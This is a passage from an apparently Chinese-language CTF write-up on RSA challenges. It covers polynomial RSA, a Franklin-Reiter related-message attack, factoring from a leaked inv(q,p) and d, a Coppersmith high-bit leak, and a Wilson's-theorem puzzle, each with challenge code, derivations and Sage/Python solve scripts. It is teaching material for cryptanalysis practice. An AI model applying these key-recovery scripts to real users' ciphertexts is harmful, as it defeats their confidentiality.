class="number">24402</span>*x^<span class="number">81</span> + <span class="number">22068</span>*x^<span class="number">80</span> + <span class="number">39263</span>*x^<span class="number">79</span> + <span class="number">23703</span>*x^<span class="number">78</span> + <span class="number">21484</span>*x^<span class="number">77</span> + <span class="number">12241</span>*x^<span class="number">76</span> + <span class="number">28821</span>*x^<span class="number">75</span> + <span class="number">32886</span>*x^<span class="number">74</span> + <span class="number">43075</span>*x^<span class="number">73</span> + <span class="number">35741</span>*x^<span class="number">72</span> + <span class="number">19936</span>*x^<span class="number">71</span> + <span class="number">37219</span>*x^<span class="number">70</span> + <span class="number">33411</span>*x^<span class="number">69</span> + <span class="number">8301</span>*x^<span class="number">68</span> + <span class="number">12949</span>*x^<span class="number">67</span> + <span class="number">28611</span>*x^<span class="number">66</span> + <span class="number">42654</span>*x^<span class="number">65</span> + <span class="number">6910</span>*x^<span class="number">64</span> + <span class="number">18523</span>*x^<span class="number">63</span> + <span class="number">31144</span>*x^<span class="number">62</span> + <span class="number">21398</span>*x^<span class="number">61</span> + <span class="number">36298</span>*x^<span class="number">60</span> + <span class="number">27158</span>*x^<span class="number">59</span> + <span class="number">918</span>*x^<span class="number">58</span> + <span class="number">38601</span>*x^<span class="number">57</span> + <span class="number">4269</span>*x^<span class="number">56</span> + <span class="number">5699</span>*x^<span class="number">55</span> + <span class="number">36444</span>*x^<span class="number">54</span> + <span class="number">34791</span>*x^<span class="number">53</span> + <span class="number">37978</span>*x^<span class="number">52</span> + <span class="number">32481</span>*x^<span class="number">51</span> + <span class="number">8039</span>*x^<span class="number">50</span> + <span class="number">11012</span>*x^<span class="number">49</span> + <span class="number">11454</span>*x^<span class="number">48</span> + <span class="number">30450</span>*x^<span class="number">47</span> + <span class="number">1381</span>*x^<span class="number">46</span> + <span class="number">32403</span>*x^<span class="number">45</span> + <span class="number">8202</span>*x^<span class="number">44</span> + <span class="number">8404</span>*x^<span class="number">43</span> + <span class="number">37648</span>*x^<span class="number">42</span> + <span class="number">43696</span>*x^<span class="number">41</span> + <span class="number">34237</span>*x^<span class="number">40</span> + <span class="number">36490</span>*x^<span class="number">39</span> + <span class="number">41423</span>*x^<span class="number">38</span> + <span class="number">35792</span>*x^<span class="number">37</span> + <span class="number">36950</span>*x^<span class="number">36</span> + <span class="number">31086</span>*x^<span class="number">35</span> + <span class="number">38970</span>*x^<span class="number">34</span> + <span class="number">12439</span>*x^<span class="number">33</span> + <span class="number">7963</span>*x^<span class="number">32</span> + <span class="number">16150</span>*x^<span class="number">31</span> + <span class="number">11382</span>*x^<span class="number">30</span> + <span class="number">3038</span>*x^<span class="number">29</span> + <span class="number">20157</span>*x^<span class="number">28</span> + <span class="number">23531</span>*x^<span class="number">27</span> + <span class="number">32866</span>*x^<span class="number">26</span> + <span class="number">5428</span>*x^<span class="number">25</span> + <span class="number">21132</span>*x^<span class="number">24</span> + <span class="number">13443</span>*x^<span class="number">23</span> + <span class="number">28909</span>*x^<span class="number">22</span> + <span class="number">42716</span>*x^<span class="number">21</span> + <span class="number">6567</span>*x^<span class="number">20</span> + <span class="number">24744</span>*x^<span class="number">19</span> + <span class="number">8727</span>*x^<span class="number">18</span> + <span class="number">14895</span>*x^<span class="number">17</span> + <span class="number">28172</span>*x^<span class="number">16</span> + <span class="number">30903</span>*x^<span class="number">15</span> + <span class="number">26608</span>*x^<span class="number">14</span> + <span class="number">27314</span>*x^<span class="number">13</span> + <span class="number">42224</span>*x^<span class="number">12</span> + <span class="number">42551</span>*x^<span class="number">11</span> + <span class="number">37726</span>*x^<span class="number">10</span> + <span class="number">11203</span>*x^<span class="number">9</span> + <span class="number">36816</span>*x^<span class="number">8</span> + <span class="number">5537</span>*x^<span class="number">7</span> + <span class="number">20301</span>*x^<span class="number">6</span> + <span class="number">17591</span>*x^<span class="number">5</span> + <span class="number">41279</span>*x^<span class="number">4</span> + <span class="number">7999</span>*x^<span class="number">3</span> + <span class="number">33753</span>*x^<span class="number">2</span> + <span class="number">34551</span>*x + <span class="number">9659</span></span><br><span class="line">S.&lt;x&gt; = R.quotient(N)</span><br><span class="line"><span class="comment">#sage 里 ^ 与 ** 相同</span></span><br><span class="line">P, Q = N.factor()</span><br><span class="line">P, Q = P[<span class="number">0</span>], Q[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(P.degree(), Q.degree())  <span class="comment"># 次数，即：最高次</span></span><br><span class="line">phi = (p ** P.degree() - <span class="number">1</span>) * (p ** Q.degree() - <span class="number">1</span>)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = inverse_mod(e, phi)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, N)  <span class="comment"># 多项式m的各系数为明文每个字符对应的ascii码</span></span><br><span class="line">m = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> m.<span class="built_in">list</span>()])</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure><h2 id="unusualrsa2-｜线性关系Franklin-Reiter攻击"><a href="#unusualrsa2-｜线性关系Franklin-Reiter攻击" class="headerlink" title="unusualrsa2    ｜线性关系Franklin-Reiter攻击"></a>unusualrsa2    ｜线性关系Franklin-Reiter攻击</h2><ul><li><p><a href="https://4xwi11.github.io/posts/80806ae5/?highlight=多项式rsa">引入</a></p></li><li><p><a href="https://www.iacr.org/archive/pkc2005/33860001/33860001.pdf">《A New Related Message Attack on RSA》</a></p></li></ul><p>一言以蔽之，利用多项式gcd得到最大公因子$x-M$</p><p>其中e=3的证明情况见<a href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_coppersmith_attack/?h=franklin+reiter#broadcast-attack-with-linear-padding">CTF-Wiki</a>,更全面的看上面论文</p><h3 id="题目-7"><a href="#题目-7" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ********************</span></span><br><span class="line"><span class="comment"># @Author: Lazzaro</span></span><br><span class="line"><span class="comment"># ********************</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long,long_to_bytes</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, x, y</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(reduce(<span class="keyword">lambda</span> x,y:x&amp;y,[(i-<span class="number">5</span>)*i+<span class="number">6</span>==<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> x]))</span><br><span class="line"><span class="keyword">assert</span>(reduce(<span class="keyword">lambda</span> x,y:x&amp;y,[(j-<span class="number">15</span>)*j+<span class="number">44</span>==<span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> y]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(reduce(<span class="keyword">lambda</span> x,y:x*m+y,x),<span class="number">17</span>,n))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(reduce(<span class="keyword">lambda</span> x,y:x*m+y,y),<span class="number">17</span>,n))</span><br><span class="line"></span><br><span class="line"><span class="comment">#23772599983135215481563178266884362291876571759991288577057472733374903836591330410574958472090396886895304944176208711481780781286891334062794555288959410390926474473859289842654809538435377431088422352076225067494924657598298955407771484146155998883073439266427190212827600119365643065276814044272790573450938596830336430371987561905132579730619341196199420897034988685012777895002554746080384319298123154671447844799088258541911028041717897434816921424155687677867019535399434825468160227242441375503664915265223696139025407768146464383537556265875013085702422829200814612395116961538432886116917063119749068212699</span></span><br><span class="line"><span class="comment">#10900151504654409767059699202929100225155892269473271859207513720755903691031362539478242920144073599515746938827937863835169270383721094542639011665235593065932998091574636525973099426040452626893461449084383663453549354608769727777329036059746386523843912382289597182615339786437186169811342356085836838520978047561127661777189045888648773949147220411427306098338616422692914110656004863767719312410906124366000507952960331116878197129010412361636679449281808407214524741732730279777729251515759320442591663641984363061618865267606007355576230009922421807527598213455112981354590909603317525854070358390622096569841</span></span><br><span class="line"><span class="comment">#17298679220717326374674940612143058330715465693318467692839033642321129433471254547497087746971317567301086124779289015934582615377165560688447452762043163082394944604062014490446763247008217251611443338103074143809936437694543761369945095202092750900940979469994907399829695696313513303922266742415376818434932335640062684245008822643258497589196668426788916969378417960200705779461808292296450298558001909603602502604228973101048082095642290047196235959438278631661658312398313171590515776453711432353011579809351076532129444735206408591345372296372378396539831385036814349328459266432393612919118094115543053115450</span></span><br></pre></td></tr></table></figure><h3 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h3><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220506153047159.png" alt="image-20220506153047159"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#脚本1</span></span><br><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">c1, c2, n, e</span>):</span></span><br><span class="line">    PR.&lt;x&gt;=PolynomialRing(Zmod(n))</span><br><span class="line">    <span class="comment"># replace a,b,c,d</span></span><br><span class="line">    g1 = (<span class="number">2</span>*x+<span class="number">3</span>)^e - c1</span><br><span class="line">    g2 = (<span class="number">4</span>*x+<span class="number">11</span>)^e - c2</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">g1, g2</span>):</span></span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line">c1 = <span class="number">10900151504654409767059699202929100225155892269473271859207513720755903691031362539478242920144073599515746938827937863835169270383721094542639011665235593065932998091574636525973099426040452626893461449084383663453549354608769727777329036059746386523843912382289597182615339786437186169811342356085836838520978047561127661777189045888648773949147220411427306098338616422692914110656004863767719312410906124366000507952960331116878197129010412361636679449281808407214524741732730279777729251515759320442591663641984363061618865267606007355576230009922421807527598213455112981354590909603317525854070358390622096569841</span></span><br><span class="line">c2 = <span class="number">17298679220717326374674940612143058330715465693318467692839033642321129433471254547497087746971317567301086124779289015934582615377165560688447452762043163082394944604062014490446763247008217251611443338103074143809936437694543761369945095202092750900940979469994907399829695696313513303922266742415376818434932335640062684245008822643258497589196668426788916969378417960200705779461808292296450298558001909603602502604228973101048082095642290047196235959438278631661658312398313171590515776453711432353011579809351076532129444735206408591345372296372378396539831385036814349328459266432393612919118094115543053115450</span></span><br><span class="line">n = <span class="number">23772599983135215481563178266884362291876571759991288577057472733374903836591330410574958472090396886895304944176208711481780781286891334062794555288959410390926474473859289842654809538435377431088422352076225067494924657598298955407771484146155998883073439266427190212827600119365643065276814044272790573450938596830336430371987561905132579730619341196199420897034988685012777895002554746080384319298123154671447844799088258541911028041717897434816921424155687677867019535399434825468160227242441375503664915265223696139025407768146464383537556265875013085702422829200814612395116961538432886116917063119749068212699</span></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line">m1 = attack(c1, c2, n, e)</span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(<span class="string">&quot;%x&quot;</span> % <span class="built_in">int</span>(m1)))</span><br></pre></td></tr></table></figure><h2 id="unusuarsa4-inv-q-p-c-d-没n"><a href="#unusuarsa4-inv-q-p-c-d-没n" class="headerlink" title="unusuarsa4    |inv(q,p),c,d;没n"></a>unusuarsa4    |inv(q,p),c,d;没n</h2><ul><li><a href="https://4xwi11.github.io/posts/80806ae5/?highlight=有限域开方#unusuarsa4">参考博客</a>(4xwill师傅yyds</li></ul><h3 id="题目-8"><a href="#题目-8" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ********************</span></span><br><span class="line"><span class="comment"># @Author: Lazzaro</span></span><br><span class="line"><span class="comment"># ********************</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line"><span class="built_in">print</span>(invert(q,p))</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">q_1 = <span class="number">113350138578125471637271827037682321496361317426731366252238155037440385105997423113671392038498349668206564266165641194668802966439465128197299073392773586475372002967691512324151673246253769186679521811837698540632534357656221715752733588763108463093085549826122278822507051740839450621887847679420115044512</span></span><br><span class="line">d = <span class="number">27451162557471435115589774083548548295656504741540442329428952622804866596982747294930359990602468139076296433114830591568558281638895221175730257057177963017177029796952153436494826699802526267315286199047856818119832831065330607262567182123834935483241720327760312585050990828017966534872294866865933062292893033455722786996125448961180665396831710915882697366767203858387536850040283296013681157070419459208544201363726008380145444214578735817521392863391376821427153094146080055636026442795625833039248405951946367504865008639190248509000950429593990524808051779361516918410348680313371657111798761410501793645137</span></span><br><span class="line">c = <span class="number">619543409290228183446186073184791934402487500047968659800765382797769750763696880547221266055431306972840980865602729031475343233357485820872268765911041297456664938715949124290204230537793877747551374176167292845717246943780371146830637073310108630812389581197831196039107931968703635129091224513813241403591357678410312272233389708366642638825455844282490676862737715585788829936919637988039113463707959069907015464745700766013573282604376277598510224455044288896809217461295080140187509519005245601483583507547733673523120385089098002298314719617693895392148294399937798485146568296114338393548124451378170302291</span></span><br></pre></td></tr></table></figure><h3 id="题解-7"><a href="#题解-7" class="headerlink" title="题解"></a>题解</h3><h4 id="理论推理"><a href="#理论推理" class="headerlink" title="理论推理"></a><strong>理论推理</strong></h4><ul><li>hint1: $$inv(q, p) · phi  \mod p$$</li><li>hint2: <ul><li>费马小定理</li><li>给定r, k1, k2，若 k2|k1，则：$r \mod k2 = (r \mod k1) \mod k2$</li></ul></li></ul><p>记inv(q, p) = q1, 题目给了q1，那么有如下性质:</p><p>$$q1* q ≡ 1 \mod p$$</p><p>构造hint1的格式：</p><p>$$q1•phi ≡ q1•(p-1)•(q-1) ≡ (p-1)•(q1•q - q1) ≡ (p-1) (1-q1) ≡ (1-q1) \mod p$$</p><p>即：</p><p>$$q1•phi + q1 -1 = k•p$$</p><p><strong>记kp = q1*phi + q1 -1 ,则：p | kp</strong></p><p>接下来，聚焦hint2,任选满足$gcd(g, p) = 1$的g, 则：</p><p>$$g^{phi} ≡ 1 \mod n$$    —&gt;     $$g^{phi} ≡ 1 \mod p$$    —&gt;    $$(g^{phi} \mod kp) ≡ 1 \mod p$$</p><p>即：</p><p>$$p |(g^{phi} \mod kp) - 1$$</p><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a><strong>解题思路</strong></h4><ol><li><p>知道e、d,则:$e*d -1 = k’ * phi$</p><p>利用此，爆破phi</p></li><li><p>用爆破出的phi计算<strong>kp</strong></p></li><li><p>任选两个素数g1, g2（这样有gcd(g, p) =1)</p><p>计算出x1 = $(g_1^{phi} \mod kp) -1$, x2 = $(g_2^{phi} \mod kp) -1$</p><p>易得：p = gcd(x1, x2)</p></li><li><p>由phi、p得q、n</p></li><li><p>RSA解密</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">q1 = <span class="number">113350138578125471637271827037682321496361317426731366252238155037440385105997423113671392038498349668206564266165641194668802966439465128197299073392773586475372002967691512324151673246253769186679521811837698540632534357656221715752733588763108463093085549826122278822507051740839450621887847679420115044512</span></span><br><span class="line">d = <span class="number">27451162557471435115589774083548548295656504741540442329428952622804866596982747294930359990602468139076296433114830591568558281638895221175730257057177963017177029796952153436494826699802526267315286199047856818119832831065330607262567182123834935483241720327760312585050990828017966534872294866865933062292893033455722786996125448961180665396831710915882697366767203858387536850040283296013681157070419459208544201363726008380145444214578735817521392863391376821427153094146080055636026442795625833039248405951946367504865008639190248509000950429593990524808051779361516918410348680313371657111798761410501793645137</span></span><br><span class="line">c = <span class="number">619543409290228183446186073184791934402487500047968659800765382797769750763696880547221266055431306972840980865602729031475343233357485820872268765911041297456664938715949124290204230537793877747551374176167292845717246943780371146830637073310108630812389581197831196039107931968703635129091224513813241403591357678410312272233389708366642638825455844282490676862737715585788829936919637988039113463707959069907015464745700766013573282604376277598510224455044288896809217461295080140187509519005245601483583507547733673523120385089098002298314719617693895392148294399937798485146568296114338393548124451378170302291</span></span><br><span class="line"></span><br><span class="line">k = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> (e * d - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">        phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">        kp = q1 * phi - q1 + <span class="number">1</span></span><br><span class="line">        x1 = <span class="built_in">pow</span>(<span class="number">3</span>, phi, kp) - <span class="number">1</span></span><br><span class="line">        x2 = <span class="built_in">pow</span>(<span class="number">5</span>, phi, kp) - <span class="number">1</span></span><br><span class="line">        x = gmpy2.gcd(x1, x2)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>(<span class="built_in">bin</span>(x)).replace(<span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;&#x27;</span>)) == <span class="number">1024</span>:</span><br><span class="line">            p = x</span><br><span class="line">            q = (phi // (p - <span class="number">1</span>)) + <span class="number">1</span></span><br><span class="line">            n = p * q</span><br><span class="line">            m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">            <span class="built_in">print</span>(m)</span><br><span class="line">            <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line">    k += <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="unusualrsa1-｜m高位泄漏"><a href="#unusualrsa1-｜m高位泄漏" class="headerlink" title="unusualrsa1    ｜m高位泄漏"></a>unusualrsa1    ｜m高位泄漏</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ********************</span></span><br><span class="line"><span class="comment"># @Author: Lazzaro</span></span><br><span class="line"><span class="comment"># ********************</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long,long_to_bytes</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(long_to_bytes(randint(<span class="number">0</span>,<span class="number">30</span>))*<span class="number">208</span>+flag)</span><br><span class="line"><span class="keyword">assert</span>(m.bit_length()==<span class="number">2044</span>)</span><br><span class="line"><span class="built_in">print</span>((m&gt;&gt;<span class="number">315</span>)&lt;&lt;<span class="number">315</span>)</span><br><span class="line">c = <span class="built_in">pow</span>(m,<span class="number">3</span>,n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment">#14113948189208713011909396304970377626324044633561155020366406284451614054260708934598840781397326960921718892801653205159753091559901114082556464576477585198060530094478860626532455065960136263963965819002575418616768412539016154873800614138683106056209070597212668250136909436974469812231498651367459717175769611385545792201291192023843434476550550829737236225181770896867698281325858412643953550465132756142888893550007041167700300621499970661661288422834479368072744930285128061160879720771910458653611076539210357701565156322144818787619821653007453741709031635862923191561438148729294430924288173571196757351837</span></span><br><span class="line"><span class="comment">#1520800285708753284739523608878585974609134243280728660335545667177630830064371336150456537012842986526527904043383436211487979254140749228004148347597566264500276581990635110200009305900689510908049771218073767918907869112593870878204145615928290375086195098919355531430003571366638390993296583488184959318678321571278510231561645872308920917404996519309473979203661442792048291421574603018835698487725981963573816645574675640357569465990665689618997534740389987351864738104038598104713275375385003471306823348792559733332094774873827383320058176803218213042061965933143968710199376164960850951030741280074168795136</span></span><br><span class="line"><span class="comment">#6635663565033382363211849843446648120305449056573116171933923595209656581213410699649926913276685818674688954045817246263487415328838542489103709103428412175252447323358040041217431171817865818374522191881448865227314554997131690963910348820833080760482835650538394814181656599175839964284713498394589419605748581347163389157651739759144560719049281761889094518791244702056048080280278984031050608249265997808217512349309696532160108250480622956599732443714546043439089844571655280770141647694859907985919056009576606333143546094941635324929407538860140272562570973340199814409134962729885962133342668270226853146819</span></span><br></pre></td></tr></table></figure><h3 id="题解-8"><a href="#题解-8" class="headerlink" title="题解"></a>题解</h3><p>m高位泄漏</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">14113948189208713011909396304970377626324044633561155020366406284451614054260708934598840781397326960921718892801653205159753091559901114082556464576477585198060530094478860626532455065960136263963965819002575418616768412539016154873800614138683106056209070597212668250136909436974469812231498651367459717175769611385545792201291192023843434476550550829737236225181770896867698281325858412643953550465132756142888893550007041167700300621499970661661288422834479368072744930285128061160879720771910458653611076539210357701565156322144818787619821653007453741709031635862923191561438148729294430924288173571196757351837</span></span><br><span class="line">mbar = <span class="number">1520800285708753284739523608878585974609134243280728660335545667177630830064371336150456537012842986526527904043383436211487979254140749228004148347597566264500276581990635110200009305900689510908049771218073767918907869112593870878204145615928290375086195098919355531430003571366638390993296583488184959318678321571278510231561645872308920917404996519309473979203661442792048291421574603018835698487725981963573816645574675640357569465990665689618997534740389987351864738104038598104713275375385003471306823348792559733332094774873827383320058176803218213042061965933143968710199376164960850951030741280074168795136</span></span><br><span class="line">c = <span class="number">6635663565033382363211849843446648120305449056573116171933923595209656581213410699649926913276685818674688954045817246263487415328838542489103709103428412175252447323358040041217431171817865818374522191881448865227314554997131690963910348820833080760482835650538394814181656599175839964284713498394589419605748581347163389157651739759144560719049281761889094518791244702056048080280278984031050608249265997808217512349309696532160108250480622956599732443714546043439089844571655280770141647694859907985919056009576606333143546094941635324929407538860140272562570973340199814409134962729885962133342668270226853146819</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">kbits = <span class="number">315</span></span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt;=PolynomialRing(Zmod(n))</span><br><span class="line">f = (mbar + x) ^ e - c</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">1</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor = n</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(mbar) + <span class="built_in">int</span>(x0)))</span><br></pre></td></tr></table></figure><h2 id="长安杯-2021-checkin-｜威尔逊定理"><a href="#长安杯-2021-checkin-｜威尔逊定理" class="headerlink" title="[长安杯 2021]checkin    ｜威尔逊定理"></a>[长安杯 2021]checkin    ｜威尔逊定理</h2><h3 id="题目-9"><a href="#题目-9" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">16</span>)</span><br><span class="line">n = p*q</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,p-q):</span><br><span class="line">    m = m*i%n</span><br><span class="line">e = <span class="number">1049</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(<span class="number">2</span>,e,n))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(m,e,n))</span><br><span class="line"><span class="comment">#4513855932190587780512692251070948513905472536079140708186519998265613363916408288602023081671609336332823271976169443708346965729874135535872958782973382975364993581165018591335971709648749814573285241290480406050308656233944927823668976933579733318618949138978777831374262042028072274386196484449175052332019377</span></span><br><span class="line"><span class="comment">#3303523331971096467930886326777599963627226774247658707743111351666869650815726173155008595010291772118253071226982001526457616278548388482820628617705073304972902604395335278436888382882457685710065067829657299760804647364231959804889954665450340608878490911738748836150745677968305248021749608323124958372559270</span></span><br></pre></td></tr></table></figure><h3 id="题解-9"><a href="#题解-9" class="headerlink" title="题解"></a>题解</h3><p>前置知识</p><h4 id="威尔逊定理："><a href="#威尔逊定理：" class="headerlink" title="威尔逊定理："></a>威尔逊定理：</h4><ul><li><p>对于<strong>素数p</strong>有充分必要条件：</p><p>$$(p-1)! ≡ -1 \mod p$$</p></li></ul><p>聚焦题目,已知：</p><ol><li>$$c1 = 2^e \mod n$$</li><li>$$c2 = m^{e} \mod n$$</li><li>e = 1049</li></ol><p>利用 1 ，得到：$c1 - 2^e = k*n$</p><p>分解$c1-2^e$再根据位数，<strong>得到p、q</strong></p><p>解出<code>m_</code>（此<code>m_</code>显然不是flag对应的long型数字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 